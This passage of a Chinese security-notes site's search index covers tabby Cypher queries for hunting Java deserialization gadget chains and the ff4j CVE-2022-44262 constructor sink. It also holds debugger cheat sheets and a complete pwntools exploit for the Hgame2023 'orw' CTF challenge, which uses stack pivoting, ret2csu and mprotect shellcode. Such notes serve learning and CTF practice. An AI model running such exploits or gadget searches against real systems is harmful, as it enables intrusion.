[\"javax.management.BadAttributeValueExpException\",\"com.sun.jmx.snmp.SnmpEngineId\",\"com.sun.xml.internal.ws.api.BindingID\",\"javax.swing.text.html.HTML$UnknownTag\"])\nreturn path limit 1\n</code></pre></p> <pre><code>match (source:Method) where source.NAME in [\"equals\",\"hashCode\",\"compareTo\"] with collect(source) as sources\nmatch (sink:Method {IS_SINK:true}) where sink.NAME =~ \"invoke\" and sink.VUL =~ \"CODE\" and sink.CLASSNAME =~ \"java.lang.reflect.Method\"\nwith sources, collect(sink) as sinks\ncall tabby.algo.allSimplePaths(sinks,sources, 15, false) yield path where none(n in nodes(path) where (n.CLASSNAME =~ \"java.util.Iterator\" or n.CLASSNAME =~ \"java.util.Enumeration\" or n.CLASSNAME =~ \"java.util.Map\" or n.CLASSNAME =~ \"java.util.List\" or n.CLASSNAME=~\"jdk.nashorn.internal.ir.UnaryNode\" or n.CLASSNAME=~\"com.sun.jndi.ldap.ClientId\" or n.CLASSNAME=~\"org.apache.catalina.webresources.TrackedInputStream\"))\nreturn path limit 1\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/tabby/#constructor-cve-2022-44262","title":"\u9650\u5236constructor: CVE-2022-44262","text":"<pre><code>match (constructor:Method{NAME:\"&lt;init&gt;\",IS_PUBLIC:true})\nmatch (clazz:Class)\nmatch (sink:Method {IS_SINK:true})&lt;-[:CALL]-(m1:Method)\nwhere (clazz)-[:HAS]-&gt;(constructor) and constructor.PARAMETER_SIZE=2 and constructor.SUB_SIGNATURE=\"void &lt;init&gt;(java.lang.String,java.lang.String)\"\ncall apoc.algo.allSimplePaths(sink,constructor, \"&lt;CALL|ALIAS\", 5) yield path\nreturn path\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2022-44262%20ff4j%E7%89%B9%E6%AE%8A%E7%B1%BB%E5%AE%9E%E4%BE%8B%E5%8C%96/","title":"CVE-2022-44262 ff4j\u7279\u6b8a\u7c7b\u5b9e\u4f8b\u5316","text":"<p>SSRF POC</p> <p>https://github.com/ff4j/ff4j/issues/624</p> <p>\u5bb9\u6613\u5b9a\u4f4d\u5230PropertiesParser#parseProperties</p> <pre><code>...\nConstructor&lt;?&gt; constr = Class.forName(optionalType).getConstructor(String.class, String.class);\nap = (Property&lt;?&gt;) constr.newInstance(name, strValue);\n...\n</code></pre> <p>\u5176\u4e2doptionalType\uff0cname\uff0cstrValue\u90fd\u662f\u53ef\u63a7\u7684\u3002</p> <p>\u4e0a\u9762POC\u7528\u7684<code>ResourcePropertySource</code>\u8fd9\u4e2a\u7c7b\u53ef\u4ee5SSRF\uff0c\u4f46\u662f\u60c5\u62a5\u8bf4\u53ef\u4ee5\u5bfc\u81f4RCE\uff0c\u7528tabby\u641c\u4e86\u4e00\u4e0b\uff0c\u4f46\u662f\u53ef\u60dc\u6ca1\u627e\u5230ww</p> <pre><code>match (constructor:Method{NAME:\"&lt;init&gt;\",IS_PUBLIC:true})\nmatch (clazz:Class)\nmatch (sink:Method {IS_SINK:true})&lt;-[:CALL]-(m1:Method)\nwhere (clazz)-[:HAS]-&gt;(constructor) and constructor.PARAMETER_SIZE=2 and constructor.SUB_SIGNATURE=\"void &lt;init&gt;(java.lang.String,java.lang.String)\"\ncall apoc.algo.allSimplePaths(sink,constructor, \"&lt;CALL|ALIAS\", 5) yield path\nreturn path\n</code></pre> <p>\u52c9\u5f3a\u627e\u5230\u4e86<code>java.io.PrintStream</code>\u8fd9\u4e2a\u7c7b\uff0c\u6784\u9020\u5668\u53ef\u4ee5\u5bfc\u81f4\u4efb\u610f\u7a7a\u6587\u4ef6\u521b\u5efa\uff0c\u8986\u76d6\u539f\u6709\u6587\u4ef6\u3002</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/","title":"GDB","text":""},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#_1","title":"\u53cd\u6c47\u7f16","text":"<p>disass [function]  pdisass: Compatibility layer for PEDA's pdisass command.</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#x","title":"x\u547d\u4ee4","text":"<pre><code>x/nfu\n\nx/20gx  \u5341\u516d\u8fdb\u5236,\u4e00\u5355\u4f4d8\u5b57\u8282\nx/20gc  \u5b57\u7b26\n\nn\u8868\u793a\u8981\u663e\u793a\u7684\u5185\u5b58\u5355\u5143\u7684\u4e2a\u6570\n\nu\u8868\u793a\u4e00\u4e2a\u5730\u5740\u5355\u5143\u7684\u957f\u5ea6\nb\u8868\u793a\u5355\u5b57\u8282\uff0c\nh\u8868\u793a\u53cc\u5b57\u8282\uff0c\nw\u8868\u793a\u56db\u5b57\u8282\uff0c\ng\u8868\u793a\u516b\u5b57\u8282\n\nf\u8868\u793a\u663e\u793a\u65b9\u5f0f, \u53ef\u53d6\u5982\u4e0b\u503c\nx \u6309\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u53d8\u91cf\u3002\nd \u6309\u5341\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u53d8\u91cf\u3002\nu \u6309\u5341\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u65e0\u7b26\u53f7\u6574\u578b\u3002\no \u6309\u516b\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u53d8\u91cf\u3002\nt \u6309\u4e8c\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u53d8\u91cf\u3002\na \u6309\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u53d8\u91cf\u3002\ni \u6307\u4ee4\u5730\u5740\u683c\u5f0f\nc \u6309\u5b57\u7b26\u683c\u5f0f\u663e\u793a\u53d8\u91cf\u3002\nf \u6309\u6d6e\u70b9\u6570\u683c\u5f0f\u663e\u793a\u53d8\u91cf\u3002\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#snsini","title":"s/n/si/ni","text":"<p>si:step in  \u8fdb\u5165\u51fd\u6570\uff0c\u6c47\u7f16\u7ea7\u522b ni:next \u4e0d\u8fdb\u5165\u51fd\u6570\uff0c\u6c47\u7f16\u7ea7\u522b s/n c\u8bed\u8a00\u7ea7\u522b\uff0c\u5f00\u4e86\u8c03\u8bd5</p> <p>fin(finish)\u7ed3\u675f\u51fd\u6570</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#info-b","title":"info b","text":"<p>\u67e5\u770b\u65ad\u70b9</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#break-b","title":"break \u2013 b","text":"<pre><code>break &lt;address&gt; \u6307\u5b9a\u5730\u5740\u4e0b\u65ad\u70b9 (\u6700\u5e38\u7528)\uff0c\u5982\n\nbreak \u5728\u6240\u9009\u6808\u5e27\u4e2d\u6267\u884c\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u5904\u8bbe\u7f6e\u65ad\u70b9\u3002\nbreak &lt;function&gt; \u51fd\u6570\u5165\u53e3\u5904\u8bbe\u7f6e\u65ad\u7535\nbreak &lt;line&gt; \u6e90\u6587\u4ef6\u6307\u5b9a\u884c\u4e0b\u65ad\u70b9\nbreak -N break +N \u5728\u6e90\u4ee3\u7801\u6587\u4ef6\u5f53\u524d\u884c\u7684\u504f\u79fb N \u4e0b\u65ad\u70b9\u3002\nbreak &lt;filename:line&gt; \u5728\u6e90\u7801\u6587\u4ef6 filename \u7684 line \u884c\u5904\u6253\u65ad\u70b9\u3002\nbreak &lt;filename:function&gt; \u5728\u6e90\u7801\u6587\u4ef6 filename \u7684 function \u51fd\u6570\u5165\u53e3\u5904\u6253\u65ad\u70b9\u3002\nbreak ... if &lt;cond&gt; \u8bbe\u7f6e\u6761\u4ef6\u65ad\u70b9\uff0c... \u4ee3\u8868\u4e0a\u8ff0\u53c2\u6570\u4e4b\u4e00\uff08\u6216\u65e0\u53c2\u6570\uff09\uff0ccond \u4e3a\u6761\u4ef6\u8868\u8fbe\u5f0f\uff0c\u4ec5\u5728 cond \u503c\u975e\u96f6\u65f6\u505c\u4f4f\u7a0b\u5e8f\u3002\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#delete-d","title":"delete \u2013 d","text":"<p>\u5220\u9664\u65ad\u70b9</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#watch","title":"watch \uff0c\u53ef\u4ee5\u52a0\u6761\u4ef6","text":"<p>watch $eax == 0x0000ffaa</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#clear","title":"clear","text":"<p>\u5728\u6307\u5b9a\u884c\u6216\u51fd\u6570\u5904\u6e05\u9664\u65ad\u70b9\u3002\u53c2\u6570\u53ef\u4ee5\u662f\u884c\u53f7\uff0c\u51fd\u6570\u540d\u79f0\u6216 <code>*</code> \u8ddf\u4e00\u4e2a\u5730\u5740\u3002</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#kbt","title":"k/bt","text":"<p>\u67e5\u770bbacktrace bt \u6253\u5370\u6574\u4e2a\u6808\u7684\u56de\u6eaf\uff0c\u6bcf\u4e2a\u6808\u5e27\u4e00\u884c\u3002 bt n \u7c7b\u4f3c\u4e8e\u4e0a\uff0c\u4f46\u53ea\u6253\u5370\u6700\u5185\u5c42\u7684 n \u4e2a\u6808\u5e27\u3002 bt -n \u7c7b\u4f3c\u4e8e\u4e0a\uff0c\u4f46\u53ea\u6253\u5370\u6700\u5916\u5c42\u7684 n \u4e2a\u6808\u5e27\u3002 bt full n \u7c7b\u4f3c\u4e8e bt n\uff0c\u8fd8\u6253\u5370\u5c40\u90e8\u53d8\u91cf\u7684\u503c</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#print","title":"print","text":"<p>print \u2013 p \u6c42\u8868\u8fbe\u5f0f expr \u7684\u503c\u5e76\u6253\u5370\u3002\u53ef\u8bbf\u95ee\u7684\u53d8\u91cf\u662f\u6240\u9009\u6808\u5e27\u7684\u8bcd\u6cd5\u73af\u5883\uff0c\u4ee5\u53ca\u8303\u56f4\u4e3a\u5168\u5c40\u6216\u6574\u4e2a\u6587\u4ef6\u7684\u6240\u6709\u53d8\u91cf\u3002</p> <p>print [expr] print /f [expr] \u901a\u8fc7\u6307\u5b9a /f \u6765\u9009\u62e9\u4e0d\u540c\u7684\u6253\u5370\u683c\u5f0f\uff0c\u5176\u4e2d f \u662f\u4e00\u4e2a\u6307\u5b9a\u683c\u5f0f\u7684\u5b57\u6bcd</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#dumpargs","title":"dumpargs","text":"<pre><code>\u6253\u5370\u53c2\u6570\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#context","title":"context","text":"<pre><code>\u9ed8\u8ba4\u89c6\u56fe\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#canary","title":"canary","text":""},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#telescope","title":"telescope","text":"<p>usage: telescope [-h] [address] [count] Recursively dereferences pointers starting at the specified address ($sp by default)</p> <p>search</p> <pre><code>\u627e\u4e1c\u897f\n</code></pre> <p>retaddr     Print out the stack addresses that contain return addresses.</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#hexdump","title":"hexdump","text":"<pre><code>Hexdumps data at the specified address (or at $sp)\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#dt-type","title":"dt [type]","text":"<pre><code> \u4ee5\u67d0\u79cd\u5f62\u5f0fdump\u6570\u636e\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#print-x-function_name","title":"print /x &amp;function_name","text":"<pre><code>symbols\u5730\u5740\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#gotplt","title":"got/plt","text":"<pre><code>\u67e5\u770b\u8fd9\u4e24\u4e2a\u8868\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#fsbase","title":"fsbase","text":"<pre><code>fsbase\u7684\u5730\u5740\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#x20gx-rebase0xdeadbeef","title":"x/20gx $rebase(0xdeadbeef)","text":"<p>\u5f00\u542fPIE\u4fdd\u62a4\u67e5\u770bELF\u6587\u4ef6\u7684\u67d0\u4e2a\u503c\uff0c\u9700\u8981\u8ba1\u7b97\u504f\u79fb\u3002</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#libc","title":"libc","text":"<p>\u770blibc\u57fa\u5740</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#magic","title":"magic","text":"<p>\u5e38\u7528\u7684\u5b8f\uff08hook\uff09\uff0c\u5371\u9669\u51fd\u6570</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/GDB/#distance-num1-num2","title":"distance num1 num2","text":"<p>\u7b97\u504f\u79fb</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/IDA/","title":"IDA","text":"<p>\u524d\u8fdb ctrl+enter</p> <p>\u540e\u9000 esc</p> <p>x \u67e5\u627e\u5f15\u7528</p> <p>Alt+M - Set bookmark</p> <p>Ctrl+M - List bookmarks</p> <p>alt+t search</p> <p>\u5bf9\u7740\u4f60\u8981\u4fee\u6539\u7684\u53d8\u91cf\u6309\u5feb\u6377\u952ey\uff0c\u8f93\u2f0a\u4f60\u8981\u6539\u6210\u7684\u53d8\u91cf\u7c7b\u578b</p> <p>export data: in edit tag</p> <p>ctrl+s \u8df3\u8f6c\u5230\u6bb5</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/cdecl/","title":"Cdecl","text":""},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/cdecl/#cdecl","title":"cdecl","text":""},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/cdecl/#x64","title":"x64","text":"<p>\u5f53\u53c2\u6570\u5c11\u4e8e7\u4e2a\u65f6\uff0c \u53c2\u6570\u4ece\u5de6\u5230\u53f3\u653e\u5165\u5bc4\u5b58\u5668: rdi, rsi, rdx, rcx, r8, r9\u3002 \u5f53\u53c2\u6570\u4e3a7\u4e2a\u4ee5\u4e0a\u65f6\uff0c \u524d 6 \u4e2a\u4e0e\u524d\u9762\u4e00\u6837\uff0c \u4f46\u540e\u9762\u7684\u4f9d\u6b21\u4ece \u201c\u53f3\u5411\u5de6\u201d \u653e\u5165\u6808\u4e2d\uff0c\u5373\u548c32\u4f4d\u6c47\u7f16\u4e00\u6837\u3002</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/cdecl/#x86","title":"x86","text":"<pre><code>saved_ebp\nret_addr\narg2\narg1\n</code></pre> <p>\u4f8b\u5982\u8c03\u7528system\u6784\u9020\u7684\u6808\u5e27\uff1a</p> <pre><code>system_addr\nret_addr\nbinsh_addr\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/cheat%20engine/","title":"Cheat engine","text":"<p>address\u4e3a\u7eff\u8272\uff0c\u8868\u793a\u504f\u5740\u56fa\u5b9a</p> <p>ctrl+b\u6253\u5f00memory view\uff0callocation base\u4e3amodule\u7684\u57fa\u5740</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn%E5%B0%8F%E5%B7%A5%E5%85%B7/","title":"\u5c0f\u5de5\u5177","text":""},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn%E5%B0%8F%E5%B7%A5%E5%85%B7/#seccomp-tools","title":"seccomp-tools","text":"<p><code>seccomp-tools dump ./vuln</code></p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn%E5%B0%8F%E5%B7%A5%E5%85%B7/#ropgadget","title":"ROPgadget","text":"<p><code>ROPgadget --binary rop  --only 'pop|ret' | grep eax</code></p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn%E5%B0%8F%E5%B7%A5%E5%85%B7/#aslr","title":"ASLR","text":"<p>\u5173</p> <p><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p> <p>2\u662f\u5f00</p> <p>\u5982\u679c\u662fdocker\u9700\u8981\u5728\u5bbf\u4e3b\u673a\u5f00\u5173</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwn%E5%B0%8F%E5%B7%A5%E5%85%B7/#patchpwn","title":"patchpwn","text":"<p><code>patchpwn --help</code></p> <p><code>patchpwn ubuntu16 ./pwn</code></p> <p><code>patchpwn 2.27-3ubuntu1_amd64 ./pwn</code></p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/tmux/","title":"Tmux","text":"<p>\u5de6\u53f3\u5206\u5c4f\uff1aCtrl + b, % (\u5206\u5272\u5f53\u524d\u7a97\u53e3)</p> <p>\u4e0a\u4e0b\u5206\u5c4f\uff1aCtrl + b, \" (\u5206\u5272\u5f53\u524d\u7a97\u53e3)</p> <p>\u5173\u95ed\u5206\u5c4f\uff1aCtrl + b, x (\u5173\u95ed\u6240\u5728\u5206\u5c4f\u7a97\u53e3)</p> <p>\u663e\u793a\u5206\u5c4f\u7f16\u53f7\uff1aCtrl + b, q (\u663e\u793a\u5206\u5c4f\u7f16\u53f7)</p> <p>\u5206\u5c4f\u5207\u6362\uff1aCtrl + b, \u65b9\u5411\u952e(\u57fa\u672c\u53ef\u4ee5\u81ea\u7531\u5207\u6362)</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/x64dbg/","title":"X64dbg","text":"<p>ctrl+g\u8df3\u8f6c\u67d0\u5185\u5b58</p> <p>mod.base(addr) \u6253\u5370addr\u7684 module\u57fa\u5740</p> <p>step into f7</p> <p>step over f8</p> <p>Run F9</p> <p>\u6309\"CTRL+K\"\u8df3\u8f6c\u5230\u4e0a\u4e00\u7ea7\u8c03\u7528\uff0c\u6309\"CTRL+L\"\u8df3\u8f6c\u5230\u4e0b\u4e00\u7ea7\u8c03\u7528\u3002</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E5%85%AB%E8%82%A1%E6%96%87/","title":"\u516b\u80a1\u6587","text":"<p>\u65b9\u4fbf\u590d\u5236</p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E5%85%AB%E8%82%A1%E6%96%87/#_2","title":"\u811a\u672c\u5f00\u5934\u7684\u6837\u5b50","text":"<pre><code>from pwn import  *\n\ns       = lambda data               :p.send(str(data))\nsa      = lambda delim,data         :p.sendafter(str(delim), str(data))\nsl      = lambda data               :p.sendline(str(data))\nsla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))\nr       = lambda num=4096           :p.recv(num)\nru      = lambda delims, drop=True  :p.recvuntil(delims, drop)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\n\ncontext.log_level = 'DEBUG'\nbinary = './vn_2020_simpleHeap'\ncontext.binary = binary\nelf = ELF(binary,checksec=False)\np = process(binary)\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')\n\ndef dbg(cmd=''):\n    os.system('tmux set mouse on')\n    context.terminal = ['tmux','splitw','-h']\n    gdb.attach(p,cmd)\n    pause()\n</code></pre> <pre><code>from pwn import *\n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n\nelf_name = './vuln'\nlibc_name = './libc-2.31.so'\n# sh = gdb.debug(elf_name,'',env={'LD_PRELOAD': libc_name})\nsh = process(elf_name, env={'LD_PRELOAD': libc_name})\nelf = ELF(elf_name)\nlibc = ELF(libc_name)\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E5%85%AB%E8%82%A1%E6%96%87/#recv-libc-base-x64","title":"recv libc base (x64)","text":"<pre><code>addr = u64(p.recvuntil('\\n', drop=True).ljust(8, b'\\x00'))\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%A0%88%E8%BF%81%E7%A7%BB/","title":"Stack Exchange","text":""},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%A0%88%E8%BF%81%E7%A7%BB/#_1","title":"\u539f\u7406","text":"<p>\u6808\u6ea2\u51fa\u7684\u5b57\u8282\u592a\u5c11\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u8003\u8651\u628aesp, ebp\u8fc1\u79fb\u5230bss\u4e0a\u3002\u6700\u5c11\u6ea2\u51fa3\u4e2a\u5730\u5740\u5355\u5143\u5c31\u80fd\u5b8c\u6210\u3002</p> <p></p>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%A0%88%E8%BF%81%E7%A7%BB/#hgame2023-week1-orw","title":"\u4f8b\u9898\uff1aHgame2023 week1 orw","text":"<pre><code>ssize_t vuln()\n{\nchar buf[256]; // [rsp+0h] [rbp-100h] BYREF\n\nreturn read(0, buf, 0x130uLL);\n}\n</code></pre> <p>\u9898\u76ee\u9700\u8981orw\u3002\u53ef\u4ee5\u6ea2\u51fa0x28\u4e2a\u5b57\u8282\u4e5f\u5c31\u662f8\u4e2a\u5730\u5740\u5355\u5143\u3002\u6240\u4ee5\u6b63\u5e38\u89e3\u6cd5\u53ef\u4ee5\u5728\u6808\u8fc1\u79fb\u524d\u5148\u7528puts\u6cc4\u9732libc\u3002\u8fd9\u91cc\u63d0\u4f9b\u53ea\u6ea2\u51fa3\u5730\u5740\u5355\u5143\u7684\u65b9\u6cd5\u3002</p> <p>\u9700\u89813\u6b21\u5199\uff0c\u7b2c\u4e00\u6b21\u5199\u5230\u6808\u4e0a\uff0c\u5b8c\u6210bp\u7684\u8fc1\u79fb\uff1b\u7b2c\u4e8c\u6b21\u5199\u5230hijack_addr\u4e0a\u8c03\u7528puts\u6cc4\u9732libc\uff0c\u5e76\u7528ret2csuread\u51c6\u5907\u7b2c\u4e09\u6b21\u5199\uff0c\u5e76\u4e14\u5199\u597dhijack_addr+buf_size\u8ba9sp\u8fc1\u79fb\u5230hijack_addr\u4e0a\uff1b\u7b2c\u4e09\u6b21\u5199\u5230hijack_addr+buf_size\uff0c\u8c03\u7528mprotect\uff0c\u8fd4\u56de\u5230shellcode\u4e0a\u3002\u53e6\u5916\u7531\u4e8eret2csu\u7684\u65f6\u5019bp\u4f1a\u88ab\u5f39\u52300x0\u7684\u4f4d\u7f6e\uff0c\u6240\u4ee5\u4e0d\u597d\u63a7\u5236sp\uff0c\u8fd9\u91cc\u6211\u7528\u7684\u65b9\u6cd5\u662f\u7528ret\u8fd9\u4e2a\u6307\u4ee4\u4e00\u76f4\u6ed1\u5230hijack_addr+buf_size\u4e0a\u3002</p> <p>\uff08\u5c0f\u58f0\uff1a\u5176\u5b9e\u5982\u679c\u6cc4\u9732\u4e86libc\u5c31\u4e0d\u7528ret2libc\u4e86hh\uff09</p> <p></p> <pre><code>from pwn import *\n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n# sh=gdb.debug('./vuln','b read\\nc\\nb * 0x401379\\nc\\nc',env={'LD_PRELOAD': './libc-2.31.so'})\nsh = process('./vuln', env={'LD_PRELOAD': './libc-2.31.so'})\n# gdb.attach(sh,'b puts')\n# pause(1)\n# sh = remote('week-1.hgame.lwsec.cn', 31740)\nelf = ELF('./vuln')\nlibc = ELF('./libc-2.31.so')\n\nhijack_addr = 0x404500\nvuln_read_addr = 0x4012CF\nbuf_size = 0x100\npop_rdi_ret_addr = 0x0000000000401393\nleave_ret_addr = 0x4012EE\nret_addr = 0x401394\n\ncsu_end_addr = 0x401386\ncsu_front_addr = 0x401370\n\n\ndef csu(rbx, rbp, r12, r13, r14, r15, last, mprotect_addr):\n    # pop rbx,rbp,r12,r13,r14,r15\n    # rbx should be 0,\n    # rbp should not be 0, enable not to jump\n    # r15 should be the function we want to call\n    # rdi=edi=r12d\n    # rsi=r13\n    # rdx=r14\n\n    payload = p64(mprotect_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(\n        r13) + p64(r14) + p64(r15)\n    payload += p64(csu_front_addr)\n    payload += 'b' * 0x38\n    payload += p64(last)\n    return payload\n\n\npayload = 'a' * buf_size + flat([\n    hijack_addr + buf_size,\n    vuln_read_addr,\n    hijack_addr + buf_size\n])\npayload = payload.ljust(0x130, '\\x00')\nsh.sendafter('task.\\n', payload)\n\npayload = flat([\n    hijack_addr + buf_size,\n    pop_rdi_ret_addr,\n    elf.got['puts'],\n    elf.plt['puts'],\n])\npayload += p64(csu_end_addr) + csu(0, 1, 0, hijack_addr + buf_size, 0x130, elf.got['read'], ret_addr,\n                                   0)  # read(0,hijack_addr,0x130) rdi, rsi, rdx\n# payload = payload.ljust(0x100, '\\x00')\npayload += flat([p64(ret_addr)] * 11)\npayload += flat([\n    hijack_addr,\n    leave_ret_addr\n])\npayload = payload.ljust(0x130, '\\x00')\nsh.send(payload)\nlibc_base = u64(sh.recvuntil('\\n', drop=True).ljust(8, '\\x00')) - libc.sym['puts']\nsuccess('libc_base = ' + str(hex(libc_base)))\n\nmprotect_addr = libc_base + libc.sym['mprotect']\nshellcode_addr = hijack_addr + buf_size + 136\npayload = p64(csu_end_addr) + csu(0, 1, 0x404000, 0x1000, 7, hijack_addr + buf_size + 8, shellcode_addr,\n                                  mprotect_addr)  # mprotect(0x404000,0x1000,7)\nshellcode = asm(shellcraft.open(\"/flag\"))  # fd=3\nshellcode += asm(shellcraft.read(3, 0x404600, 100))\nshellcode += asm(shellcraft.write(1, 0x404600, 100))\npayload += shellcode\npayload = payload.ljust(0x130, '\\x00')\nsh.send(payload)\nprint(sh.recv())\n# sh.interactive()\n</code></pre>"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/","title":"\u6c47\u7f16\u6307\u4ee4","text":"<p>jmp [addr] \u7b49\u4ef7\u4e8e mov ip,[addr]</p> <p>call [addr] \u7b49\u4ef7\u4e8e push IP jmp [addr]</p> <p>ret \u7b49\u4ef7\u4e8e pop IP</p> <p>leave(bp.sp\u590d\u4f4d) \u7b49\u4ef7\u4e8e mov esp, ebp pop ebp</p> <p>test \u4e0e\u8fd0\u7b97\uff0c\u5982\u679c\u7ed3\u679c\u662f0\uff0cZF=1 (zero flag)</p> <p>cmp \u51cf\u6cd5\uff0c\u540c\u4e0a</p> <p>JE jumps if ZF=1</p>"}]}